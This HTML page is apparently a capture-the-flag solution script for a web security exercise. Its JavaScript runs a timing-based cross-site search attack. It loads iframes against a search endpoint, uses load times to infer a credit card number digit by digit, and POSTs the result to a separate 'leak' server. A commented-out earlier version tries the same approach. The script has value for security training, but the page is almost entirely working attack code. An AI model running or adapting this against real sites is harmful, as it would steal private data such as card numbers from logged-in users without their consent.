<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>

<script>

    let credit = [];
    function spawnFrame(filter, index) {
        let frame = document.createElement('iframe');
        frame.src = "https://xs-search.jeopardy.websec.saarland/?filter=" + credit.join('') + filter;
        frame.index = index;
        frame.filter = filter;
        frame.startTime = new Date();
        frame.onload = function() {
            let success = false;
            let endTime = new Date();
            let seconds = (endTime.getTime() - this.startTime.getTime()) / 1000;
            if (seconds >= 2) { // Found match
                success = true;
                credit[index] = filter;
                if (index === 12) {
                    const xhr = new XMLHttpRequest();
                    xhr.open("POST", "https://gameserver.websec.saarland/leak", false);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("secret=deaddeaddeaddeaddeaddeaddeaddead&data=" + credit.join(''));
                    return;
                }
            }
            if (index > 12) {
                console.log("Index over 12, should be done by now. Aborting");
                return;
            } else if (success || filter >= 9) {
                spawnFrame(0, index + 1);
            } else {
                spawnFrame(filter + 1, index);
            }
        };
        document.body.appendChild(frame);
    }
    spawnFrame(0, 0);

/*
    let ccnumber = '';
    let length = 13;

    for (let i = 0; i < length; i++) {
        //try to find partial credit card number
        for (let j = 0; j < 10; j++) {
            let xhr = new XMLHttpRequest();
            let filter = ccnumber + j;
            let frame = document.createElement('iframe');
            frame.src = "https://xs-search.jeopardy.websec.saarland/?filter=" + filter;
            frame.startTime = new Date();

            let startTime = new Date();
            try {
                xhr.send();
            } catch {}
            let endTime = new Date();
            let seconds = (startTime.getTime() - endTime.getTime()) / 1000;
            if (seconds >= 1) {
                ccnumber += j;
                break;
            }
        }
    }
    console.log(ccnumber);
    */

</script>

</body>
</html>
